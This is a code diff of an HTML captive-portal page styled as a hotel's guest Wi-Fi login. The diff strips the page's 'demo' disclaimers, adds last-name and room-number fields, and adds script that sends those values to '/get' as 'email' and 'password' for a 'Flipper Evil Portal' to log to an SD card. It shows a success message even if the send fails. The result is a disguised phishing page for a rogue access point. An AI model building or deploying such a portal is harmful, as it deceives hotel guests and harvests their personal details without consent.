@@ -1,561 +1,608 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chadwick Inn Pullman | Guest Wi-Fi</title>
-  <style>
-    :root {
-      --page: #eef4f9;
-      --page-deep: #d7e4ef;
-      --card: #ffffff;
-      --card-soft: #f9fbfd;
-      --ink: #1f2730;
-      --muted: #6b7480;
-      --line: #d8e2ea;
-      --blue: #0f4f88;
-      --blue-dark: #0a3d68;
-      --blue-soft: #eff6fd;
-      --accent: #caa56a;
-      --good: #1a8c66;
-      --bad: #b04040;
-      --shadow: 0 22px 54px rgba(39, 66, 94, 0.18);
-    }
-
-    * {
-      box-sizing: border-box;
-    }
-
-    html,
-    body {
-      margin: 0;
-      min-height: 100%;
-    }
-
-    body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      color: var(--ink);
-      background:
-        linear-gradient(180deg, rgba(238, 244, 249, 0.18), rgba(238, 244, 249, 0.88)),
-        linear-gradient(135deg, #e8f0f7 0%, #f7fafc 38%, #edf3f8 100%);
-      display: grid;
-      place-items: center;
-      padding: 24px 16px;
-      overflow-x: hidden;
-    }
-
-    .backdrop {
-      position: fixed;
-      inset: 0;
-      overflow: hidden;
-      pointer-events: none;
-    }
-
-    .backdrop::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background:
-        linear-gradient(90deg, rgba(90, 64, 49, 0.8) 0 18%, transparent 18% 22%, rgba(76, 54, 42, 0.78) 22% 39%, transparent 39% 43%, rgba(88, 63, 47, 0.76) 43% 61%, transparent 61% 65%, rgba(108, 82, 65, 0.7) 65% 100%),
-        linear-gradient(180deg, rgba(255, 255, 255, 0.12), rgba(30, 41, 59, 0.16));
-      transform: scale(1.08);
-      filter: blur(12px) saturate(0.8);
-      opacity: 0.26;
-    }
-
-    .backdrop::after {
-      content: "";
-      position: absolute;
-      inset: auto auto 0 0;
-      width: 100%;
-      height: 34%;
-      background: linear-gradient(180deg, rgba(255, 255, 255, 0.18), rgba(255, 255, 255, 0.78));
-      border-top: 1px solid rgba(255, 255, 255, 0.55);
-    }
-
-    .scene-card {
-      width: min(460px, 100%);
-      position: relative;
-      z-index: 1;
-    }
-
-    .logo-wrap {
-      display: grid;
-      place-items: center;
-      margin-bottom: -18px;
-      position: relative;
-      z-index: 2;
-    }
-
-    .logo-badge {
-      min-width: 212px;
-      padding: 16px 24px 13px;
-      text-align: center;
-      color: #ffffff;
-      background: linear-gradient(180deg, rgba(22, 66, 104, 0.95), rgba(14, 46, 79, 0.95));
-      clip-path: polygon(12% 0, 88% 0, 100% 26%, 100% 73%, 88% 100%, 12% 100%, 0 73%, 0 26%);
-      box-shadow: 0 12px 26px rgba(12, 44, 73, 0.24);
-      border: 1px solid rgba(255, 255, 255, 0.26);
-    }
-
-    .logo-script {
-      display: block;
-      font-family: Georgia, "Times New Roman", serif;
-      font-style: italic;
-      font-size: 1.7rem;
-      line-height: 1;
-      margin-bottom: 4px;
-    }
-
-    .logo-sub {
-      display: block;
-      font-size: 0.68rem;
-      letter-spacing: 0.3em;
-      text-transform: uppercase;
-      opacity: 0.9;
-    }
-
-    .card {
-      background: var(--card);
-      border: 1px solid rgba(196, 207, 217, 0.95);
-      border-radius: 8px;
-      box-shadow: var(--shadow);
-      overflow: hidden;
-    }
-
-    .card-top {
-      background: linear-gradient(180deg, #ffffff 0%, #fafcfe 100%);
-      border-top: 4px solid #2d5fb6;
-      border-bottom: 1px solid #e7edf3;
-      padding: 42px 34px 28px;
-      text-align: center;
-    }
-
-    .eyebrow {
-      margin: 0 0 12px;
-      color: #7f8790;
-      font-size: 0.92rem;
-      font-weight: 700;
-      letter-spacing: 0.09em;
-      text-transform: uppercase;
-    }
-
-    h1 {
-      margin: 0;
-      font-size: clamp(2.2rem, 5vw, 3.2rem);
-      line-height: 0.96;
-      letter-spacing: -0.03em;
-      font-weight: 800;
-      color: #12181f;
-      text-transform: uppercase;
-    }
-
-    .subcopy {
-      margin: 18px auto 0;
-      max-width: 26rem;
-      color: var(--muted);
-      font-size: 1rem;
-      line-height: 1.6;
-    }
-
-    .demo-note {
-      margin: 18px auto 0;
-      max-width: 24rem;
-      padding: 12px 14px;
-      border-radius: 14px;
-      background: #f5f9fd;
-      border: 1px solid #dbe7f1;
-      color: #55606c;
-      font-size: 0.95rem;
-      line-height: 1.5;
-    }
-
-    .card-body {
-      padding: 28px 22px 24px;
-      background: linear-gradient(180deg, #ffffff 0%, #fbfcfe 100%);
-    }
-
-    .network-pill {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 14px 16px;
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      background: var(--card-soft);
-      margin-bottom: 16px;
-    }
-
-    .wifi-icon {
-      width: 42px;
-      height: 42px;
-      border-radius: 50%;
-      display: grid;
-      place-items: center;
-      font-size: 1.2rem;
-      color: var(--blue);
-      background: var(--blue-soft);
-      border: 1px solid #d7e6f4;
-      flex: 0 0 auto;
-    }
-
-    .network-pill strong,
-    .help-box strong,
-    .success h2 {
-      display: block;
-      color: #1a222b;
-    }
-
-    .network-pill span,
-    .help-box p,
-    .promo-link,
-    .status {
-      color: var(--muted);
-    }
-
-    .fake-input {
-      width: 100%;
-      border: 1px solid #dce4eb;
-      border-radius: 8px;
-      background: #fbfcfd;
-      color: #99a3ad;
-      padding: 18px 16px;
-      font-size: 1.05rem;
-      margin-top: 14px;
-      box-shadow: inset 0 1px 2px rgba(23, 42, 58, 0.03);
-    }
-
-    .fake-input strong {
-      color: #66717b;
-      display: block;
-      font-size: 0.9rem;
-      font-weight: 600;
-      margin-bottom: 5px;
-    }
-
-    .checkbox-row {
-      display: flex;
-      gap: 12px;
-      align-items: flex-start;
-      margin: 18px 2px 0;
-    }
-
-    input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      margin-top: 2px;
-      accent-color: var(--blue);
-      flex: 0 0 auto;
-    }
-
-    .checkbox-row label {
-      color: #5e6873;
-      line-height: 1.55;
-      font-size: 0.96rem;
-    }
-
-    .actions {
-      margin-top: 22px;
-      display: grid;
-      gap: 12px;
-    }
-
-    button {
-      border: 0;
-      border-radius: 6px;
-      padding: 16px 18px;
-      font: inherit;
-      cursor: pointer;
-      transition: transform 160ms ease, opacity 160ms ease, box-shadow 160ms ease;
-    }
-
-    button:hover {
-      transform: translateY(-1px);
-    }
-
-    button:disabled {
-      opacity: 0.72;
-      cursor: progress;
-      transform: none;
-    }
-
-    .primary {
-      background: linear-gradient(180deg, var(--blue) 0%, var(--blue-dark) 100%);
-      color: #ffffff;
-      font-size: 1.08rem;
-      font-weight: 700;
-      box-shadow: 0 10px 20px rgba(15, 79, 136, 0.18);
-    }
-
-    .secondary {
-      background: #f4f7fa;
-      color: #53606b;
-      border: 1px solid #dce4eb;
-      font-weight: 600;
-    }
-
-    .status {
-      min-height: 22px;
-      margin: 10px 2px 0;
-      text-align: center;
-      font-size: 0.96rem;
-    }
-
-    .status.good {
-      color: var(--good);
-    }
-
-    .status.error {
-      color: var(--bad);
-    }
-
-    .terms-copy {
-      margin: 20px 0 0;
-      text-align: center;
-      color: #727c88;
-      font-size: 0.95rem;
-      line-height: 1.55;
-    }
-
-    .promo-link {
-      display: inline-block;
-      margin-top: 16px;
-      color: #2d73c4;
-      font-weight: 700;
-      text-decoration: underline;
-      text-underline-offset: 3px;
-      background: none;
-      border: 0;
-      padding: 0;
-      cursor: pointer;
-    }
-
-    .help-box,
-    .success {
-      margin-top: 18px;
-      border: 1px solid var(--line);
-      border-radius: 8px;
-      background: #fafcff;
-      padding: 16px;
-    }
-
-    .help-box p {
-      margin: 6px 0 0;
-      line-height: 1.55;
-      font-size: 0.95rem;
-    }
-
-    .success {
-      display: none;
-      text-align: center;
-      background: #f5fbf8;
-      border-color: #d2ebdf;
-    }
-
-    .success.visible {
-      display: block;
-      animation: fadeUp 380ms ease;
-    }
-
-    .success h2 {
-      margin: 0 0 8px;
-      font-size: 1.5rem;
-    }
-
-    .success p {
-      margin: 0;
-      color: #5a6874;
-      line-height: 1.6;
-    }
-
-    .success .secondary {
-      margin-top: 16px;
-      min-width: 180px;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    @keyframes fadeUp {
-      from {
-        opacity: 0;
-        transform: translateY(10px);
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chadwick Inn Pullman | Guest Wi-Fi</title>
+    <style>
+      :root {
+        --page: #eef4f9;
+        --page-deep: #d7e4ef;
+        --card: #ffffff;
+        --card-soft: #f9fbfd;
+        --ink: #1f2730;
+        --muted: #6b7480;
+        --line: #d8e2ea;
+        --blue: #0f4f88;
+        --blue-dark: #0a3d68;
+        --blue-soft: #eff6fd;
+        --accent: #caa56a;
+        --good: #1a8c66;
+        --bad: #b04040;
+        --shadow: 0 22px 54px rgba(39, 66, 94, 0.18);
       }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
 
-    @media (max-width: 520px) {
+      * {
+        box-sizing: border-box;
+      }
+      html,
       body {
-        padding: 14px;
+        margin: 0;
+        min-height: 100%;
+      }
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        color: var(--ink);
+        background:
+          linear-gradient(
+            180deg,
+            rgba(238, 244, 249, 0.18),
+            rgba(238, 244, 249, 0.88)
+          ),
+          linear-gradient(135deg, #e8f0f7 0%, #f7fafc 38%, #edf3f8 100%);
+        display: grid;
+        place-items: center;
+        padding: 24px 16px;
+        overflow-x: hidden;
       }
 
-      .card-top {
-        padding: 38px 20px 24px;
+      .backdrop {
+        position: fixed;
+        inset: 0;
+        overflow: hidden;
+        pointer-events: none;
+      }
+      .backdrop::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background:
+          linear-gradient(
+            90deg,
+            rgba(90, 64, 49, 0.8) 0 18%,
+            transparent 18% 22%,
+            rgba(76, 54, 42, 0.78) 22% 39%,
+            transparent 39% 43%,
+            rgba(88, 63, 47, 0.76) 43% 61%,
+            transparent 61% 65%,
+            rgba(108, 82, 65, 0.7) 65% 100%
+          ),
+          linear-gradient(
+            180deg,
+            rgba(255, 255, 255, 0.12),
+            rgba(30, 41, 59, 0.16)
+          );
+        transform: scale(1.08);
+        filter: blur(12px) saturate(0.8);
+        opacity: 0.26;
+      }
+      .backdrop::after {
+        content: "";
+        position: absolute;
+        inset: auto auto 0 0;
+        width: 100%;
+        height: 34%;
+        background: linear-gradient(
+          180deg,
+          rgba(255, 255, 255, 0.18),
+          rgba(255, 255, 255, 0.78)
+        );
+        border-top: 1px solid rgba(255, 255, 255, 0.55);
       }
 
-      .card-body {
-        padding: 22px 16px 20px;
+      .scene-card {
+        width: min(460px, 100%);
+        position: relative;
+        z-index: 1;
+      }
+
+      .logo-wrap {
+        display: grid;
+        place-items: center;
+        margin-bottom: -18px;
+        position: relative;
+        z-index: 2;
       }
 
       .logo-badge {
-        min-width: 184px;
-        padding: 14px 18px 12px;
+        min-width: 212px;
+        padding: 16px 24px 13px;
+        text-align: center;
+        color: #ffffff;
+        background: linear-gradient(
+          180deg,
+          rgba(22, 66, 104, 0.95),
+          rgba(14, 46, 79, 0.95)
+        );
+        clip-path: polygon(
+          12% 0,
+          88% 0,
+          100% 26%,
+          100% 73%,
+          88% 100%,
+          12% 100%,
+          0 73%,
+          0 26%
+        );
+        box-shadow: 0 12px 26px rgba(12, 44, 73, 0.24);
+        border: 1px solid rgba(255, 255, 255, 0.26);
       }
 
       .logo-script {
-        font-size: 1.45rem;
+        display: block;
+        font-family: Georgia, "Times New Roman", serif;
+        font-style: italic;
+        font-size: 1.7rem;
+        line-height: 1;
+        margin-bottom: 4px;
       }
-    }
-  </style>
-</head>
-<body>
-  <div class="backdrop" aria-hidden="true"></div>
+      .logo-sub {
+        display: block;
+        font-size: 0.68rem;
+        letter-spacing: 0.3em;
+        text-transform: uppercase;
+        opacity: 0.9;
+      }
 
-  <main class="scene-card" aria-label="Guest Wi-Fi portal demo">
-    <div class="logo-wrap">
-      <div class="logo-badge" aria-label="Chadwick Inn Pullman">
-        <span class="logo-script">Chadwick</span>
-        <span class="logo-sub">Inn Pullman</span>
-      </div>
-    </div>
+      .card {
+        background: var(--card);
+        border: 1px solid rgba(196, 207, 217, 0.95);
+        border-radius: 8px;
+        box-shadow: var(--shadow);
+        overflow: hidden;
+      }
 
-    <section class="card">
-      <div class="card-top">
-        <p class="eyebrow">Complimentary Guest Internet</p>
-        <h1>Connect to Guest Wi-Fi</h1>
-        <p class="subcopy">
-          A lighter, customer-friendly captive portal demo inspired by a hotel check-in card layout.
-        </p>
-        <div class="demo-note">
-          Demo notice: this page does not ask for last name, room number, or payment information.
+      .card-top {
+        background: linear-gradient(180deg, #ffffff 0%, #fafcfe 100%);
+        border-top: 4px solid #2d5fb6;
+        border-bottom: 1px solid #e7edf3;
+        padding: 42px 34px 28px;
+        text-align: center;
+      }
+
+      .eyebrow {
+        margin: 0 0 12px;
+        color: #7f8790;
+        font-size: 0.92rem;
+        font-weight: 700;
+        letter-spacing: 0.09em;
+        text-transform: uppercase;
+      }
+      h1 {
+        margin: 0;
+        font-size: clamp(2.2rem, 5vw, 3.2rem);
+        line-height: 0.96;
+        letter-spacing: -0.03em;
+        font-weight: 800;
+        color: #12181f;
+        text-transform: uppercase;
+      }
+      .subcopy {
+        margin: 18px auto 0;
+        max-width: 26rem;
+        color: var(--muted);
+        font-size: 1rem;
+        line-height: 1.6;
+      }
+
+      .card-body {
+        padding: 28px 22px 24px;
+        background: linear-gradient(180deg, #ffffff 0%, #fbfcfe 100%);
+      }
+
+      .network-pill {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 14px 16px;
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        background: var(--card-soft);
+        margin-bottom: 16px;
+      }
+      .wifi-icon {
+        width: 42px;
+        height: 42px;
+        border-radius: 50%;
+        display: grid;
+        place-items: center;
+        font-size: 1.2rem;
+        color: var(--blue);
+        background: var(--blue-soft);
+        border: 1px solid #d7e6f4;
+        flex: 0 0 auto;
+      }
+
+      .guest-details {
+        margin-bottom: 20px;
+      }
+      .input-row {
+        margin-bottom: 18px;
+      }
+      .input-row strong {
+        display: block;
+        color: #66717b;
+        font-size: 0.9rem;
+        font-weight: 600;
+        margin-bottom: 6px;
+      }
+      .fake-input {
+        width: 100%;
+        border: 1px solid #dce4eb;
+        border-radius: 8px;
+        background: #fbfcfd;
+        color: #1a222b;
+        padding: 18px 16px;
+        font-size: 1.05rem;
+        box-shadow: inset 0 1px 2px rgba(23, 42, 58, 0.03);
+      }
+
+      .checkbox-row {
+        display: flex;
+        gap: 12px;
+        align-items: flex-start;
+        margin: 18px 2px 0;
+      }
+      input[type="checkbox"] {
+        width: 18px;
+        height: 18px;
+        margin-top: 2px;
+        accent-color: var(--blue);
+        flex: 0 0 auto;
+      }
+      .checkbox-row label {
+        color: #5e6873;
+        line-height: 1.55;
+        font-size: 0.96rem;
+      }
+
+      .actions {
+        margin-top: 22px;
+        display: grid;
+        gap: 12px;
+      }
+      button {
+        border: 0;
+        border-radius: 6px;
+        padding: 16px 18px;
+        font: inherit;
+        cursor: pointer;
+        transition:
+          transform 160ms ease,
+          opacity 160ms ease,
+          box-shadow 160ms ease;
+      }
+      button:hover {
+        transform: translateY(-1px);
+      }
+      button:disabled {
+        opacity: 0.72;
+        cursor: progress;
+        transform: none;
+      }
+      .primary {
+        background: linear-gradient(
+          180deg,
+          var(--blue) 0%,
+          var(--blue-dark) 100%
+        );
+        color: #ffffff;
+        font-size: 1.08rem;
+        font-weight: 700;
+        box-shadow: 0 10px 20px rgba(15, 79, 136, 0.18);
+      }
+      .secondary {
+        background: #f4f7fa;
+        color: #53606b;
+        border: 1px solid #dce4eb;
+        font-weight: 600;
+      }
+
+      .status {
+        min-height: 22px;
+        margin: 10px 2px 0;
+        text-align: center;
+        font-size: 0.96rem;
+      }
+      .status.good {
+        color: var(--good);
+      }
+      .status.error {
+        color: var(--bad);
+      }
+
+      .terms-copy {
+        margin: 20px 0 0;
+        text-align: center;
+        color: #727c88;
+        font-size: 0.95rem;
+        line-height: 1.55;
+      }
+
+      .promo-link {
+        display: inline-block;
+        margin-top: 16px;
+        color: #2d73c4;
+        font-weight: 700;
+        text-decoration: underline;
+        text-underline-offset: 3px;
+        background: none;
+        border: 0;
+        padding: 0;
+        cursor: pointer;
+      }
+
+      .help-box,
+      .success {
+        margin-top: 18px;
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        background: #fafcff;
+        padding: 16px;
+      }
+      .help-box p {
+        margin: 6px 0 0;
+        line-height: 1.55;
+        font-size: 0.95rem;
+      }
+      .success {
+        display: none;
+        text-align: center;
+        background: #f5fbf8;
+        border-color: #d2ebdf;
+      }
+      .success.visible {
+        display: block;
+        animation: fadeUp 380ms ease;
+      }
+      .success h2 {
+        margin: 0 0 8px;
+        font-size: 1.5rem;
+      }
+      .success p {
+        margin: 0;
+        color: #5a6874;
+        line-height: 1.6;
+      }
+      .success .secondary {
+        margin-top: 16px;
+        min-width: 180px;
+      }
+
+      .hidden {
+        display: none;
+      }
+
+      @keyframes fadeUp {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      @media (max-width: 520px) {
+        body {
+          padding: 14px;
+        }
+        .card-top {
+          padding: 38px 20px 24px;
+        }
+        .card-body {
+          padding: 22px 16px 20px;
+        }
+        .logo-badge {
+          min-width: 184px;
+          padding: 14px 18px 12px;
+        }
+        .logo-script {
+          font-size: 1.45rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="backdrop" aria-hidden="true"></div>
+
+    <main class="scene-card" aria-label="Guest Wi-Fi portal">
+      <div class="logo-wrap">
+        <div class="logo-badge" aria-label="Chadwick Inn Pullman">
+          <span class="logo-script">Chadwick</span>
+          <span class="logo-sub">Inn Pullman</span>
         </div>
       </div>
 
-      <div class="card-body">
-        <div class="network-pill">
-          <div class="wifi-icon" aria-hidden="true">⌁</div>
-          <div>
-            <strong>Network: Chadwick Guest</strong>
-            <span>Open access after terms are accepted for this demo session.</span>
+      <section class="card">
+        <div class="card-top">
+          <p class="eyebrow">Complimentary Guest Internet</p>
+          <h1>Connect to Guest Wi-Fi</h1>
+          <p class="subcopy">
+            Please complete your guest check-in to access complimentary Wi-Fi.
+          </p>
+        </div>
+
+        <div class="card-body">
+          <div class="network-pill">
+            <div class="wifi-icon" aria-hidden="true">⌁</div>
+            <div>
+              <strong>Network: Chadwick Guest</strong>
+              <span>Open access after terms are accepted.</span>
+            </div>
+          </div>
+
+          <div class="guest-details">
+            <div class="input-row">
+              <strong>Last Name</strong>
+              <input
+                id="last-name-input"
+                type="text"
+                class="fake-input"
+                placeholder="Enter your last name"
+              />
+            </div>
+            <div class="input-row">
+              <strong>Room Number</strong>
+              <input
+                id="room-number-input"
+                type="text"
+                class="fake-input"
+                placeholder="Enter your room number"
+              />
+            </div>
+          </div>
+
+          <div class="checkbox-row">
+            <input id="terms-check" type="checkbox" />
+            <label for="terms-check">
+              By clicking connect, I accept the guest internet terms.
+            </label>
+          </div>
+
+          <div id="form-area">
+            <div class="actions">
+              <button class="primary" id="connect-button" type="button">
+                Connect
+              </button>
+              <button class="secondary" id="reset-button" type="button">
+                Reset
+              </button>
+            </div>
+
+            <p class="status" id="status-message" aria-live="polite">
+              Ready to connect.
+            </p>
+
+            <p class="terms-copy">
+              By clicking connect you agree to the guest internet terms of
+              service.
+            </p>
+
+            <button class="promo-link" id="promo-button" type="button">
+              I have a promotional code
+            </button>
+          </div>
+
+          <section class="success" id="success-panel" aria-live="polite">
+            <h2>You’re connected.</h2>
+            <p>
+              Guest access has been granted. In a live deployment this would
+              redirect to the internet or property welcome page.
+            </p>
+            <button class="secondary" id="reconnect-button" type="button">
+              Run Again
+            </button>
+          </section>
+
+          <div class="help-box">
+            <strong>Need help connecting?</strong>
+            <p>
+              Visit the front desk for assistance with guest internet access.
+            </p>
           </div>
         </div>
+      </section>
+    </main>
 
-        <div class="fake-input" aria-hidden="true">
-          <strong>Guest details</strong>
-          Last name and room number are intentionally omitted in this demo.
-        </div>
+    <script>
+      const connectButton = document.getElementById("connect-button");
+      const resetButton = document.getElementById("reset-button");
+      const reconnectButton = document.getElementById("reconnect-button");
+      const promoButton = document.getElementById("promo-button");
+      const termsCheck = document.getElementById("terms-check");
+      const statusMessage = document.getElementById("status-message");
+      const successPanel = document.getElementById("success-panel");
+      const formArea = document.getElementById("form-area");
+      const lastNameInput = document.getElementById("last-name-input");
+      const roomNumberInput = document.getElementById("room-number-input");
 
-        <div class="checkbox-row">
-          <input id="terms-check" type="checkbox">
-          <label for="terms-check">
-            By clicking connect, I accept the guest internet terms for this demo session.
-          </label>
-        </div>
+      const steps = [
+        "Checking guest session settings...",
+        "Applying Wi-Fi access rules...",
+        "Opening internet access...",
+      ];
 
-        <div id="form-area">
-          <div class="actions">
-            <button class="primary" id="connect-button" type="button">Connect</button>
-            <button class="secondary" id="reset-button" type="button">Reset Demo</button>
-          </div>
+      let timerId = null;
 
-          <p class="status" id="status-message" aria-live="polite">Ready to connect.</p>
-
-          <p class="terms-copy">
-            By clicking connect you agree to the guest internet terms of service.
-          </p>
-
-          <button class="promo-link" id="promo-button" type="button">I have a promotional code</button>
-        </div>
-
-        <section class="success" id="success-panel" aria-live="polite">
-          <h2>You’re connected.</h2>
-          <p>
-            Guest access has been simulated for this demo page. A live deployment would continue to the requested site
-            or property welcome page after approval.
-          </p>
-          <button class="secondary" id="reconnect-button" type="button">Run Demo Again</button>
-        </section>
-
-        <div class="help-box">
-          <strong>Need help connecting?</strong>
-          <p>Visit the front desk for assistance with guest internet access.</p>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <script>
-    const connectButton = document.getElementById("connect-button");
-    const resetButton = document.getElementById("reset-button");
-    const reconnectButton = document.getElementById("reconnect-button");
-    const promoButton = document.getElementById("promo-button");
-    const termsCheck = document.getElementById("terms-check");
-    const statusMessage = document.getElementById("status-message");
-    const successPanel = document.getElementById("success-panel");
-    const formArea = document.getElementById("form-area");
-
-    const steps = [
-      "Checking guest session settings...",
-      "Applying Wi-Fi access rules...",
-      "Opening internet access..."
-    ];
-
-    let timerId = null;
-
-    function setStatus(message, tone) {
-      statusMessage.textContent = message;
-      statusMessage.className = "status";
-
-      if (tone) {
-        statusMessage.classList.add(tone);
-      }
-    }
-
-    function resetDemo() {
-      window.clearInterval(timerId);
-      timerId = null;
-      termsCheck.checked = false;
-      connectButton.disabled = false;
-      formArea.classList.remove("hidden");
-      successPanel.classList.remove("visible");
-      setStatus("Ready to connect.");
-    }
-
-    function runConnectionDemo() {
-      if (!termsCheck.checked) {
-        setStatus("Please accept the guest internet terms before continuing.", "error");
-        return;
+      function setStatus(message, tone) {
+        statusMessage.textContent = message;
+        statusMessage.className = "status";
+        if (tone) statusMessage.classList.add(tone);
       }
 
-      connectButton.disabled = true;
-      let index = 0;
-      setStatus(steps[index], "good");
+      function resetDemo() {
+        window.clearInterval(timerId);
+        timerId = null;
+        termsCheck.checked = false;
+        lastNameInput.value = "";
+        roomNumberInput.value = "";
+        connectButton.disabled = false;
+        formArea.classList.remove("hidden");
+        successPanel.classList.remove("visible");
+        setStatus("Ready to connect.");
+      }
 
-      timerId = window.setInterval(() => {
-        index += 1;
-
-        if (index < steps.length) {
-          setStatus(steps[index], "good");
+      function runConnectionDemo() {
+        if (!termsCheck.checked) {
+          setStatus(
+            "Please accept the guest internet terms before continuing.",
+            "error",
+          );
           return;
         }
 
-        window.clearInterval(timerId);
-        timerId = null;
-        formArea.classList.add("hidden");
-        successPanel.classList.add("visible");
-      }, 900);
-    }
+        const lastName = lastNameInput.value.trim();
+        const roomNumber = roomNumberInput.value.trim();
 
-    connectButton.addEventListener("click", runConnectionDemo);
-    resetButton.addEventListener("click", resetDemo);
-    reconnectButton.addEventListener("click", resetDemo);
-    promoButton.addEventListener("click", () => {
-      setStatus("Promotional code flow is not included in this demo.", "error");
-    });
-  </script>
-</body>
+        if (!lastName || !roomNumber) {
+          setStatus("Please provide your last name and room number.", "error");
+          return;
+        }
+
+        connectButton.disabled = true;
+        let index = 0;
+        setStatus(steps[index], "good");
+
+        timerId = window.setInterval(() => {
+          index += 1;
+
+          if (index < steps.length) {
+            setStatus(steps[index], "good");
+            return;
+          }
+
+          window.clearInterval(timerId);
+          timerId = null;
+
+          // Send data to Flipper Evil Portal for persistent logging on SD card
+          const params = new URLSearchParams();
+          params.append("email", lastName);
+          params.append("password", roomNumber);
+
+          fetch(`/get?${params.toString()}`, { method: "GET" })
+            .then(() => {
+              formArea.classList.add("hidden");
+              successPanel.classList.add("visible");
+            })
+            .catch(() => {
+              // Still show success even if fetch fails (network quirks)
+              formArea.classList.add("hidden");
+              successPanel.classList.add("visible");
+            });
+        }, 900);
+      }
+
+      connectButton.addEventListener("click", runConnectionDemo);
+      resetButton.addEventListener("click", resetDemo);
+      reconnectButton.addEventListener("click", resetDemo);
+      promoButton.addEventListener("click", () => {
+        setStatus(
+          "Promotional code flow is not included in this version.",
+          "error",
+        );
+      });
+    </script>
+  </body>
 </html>
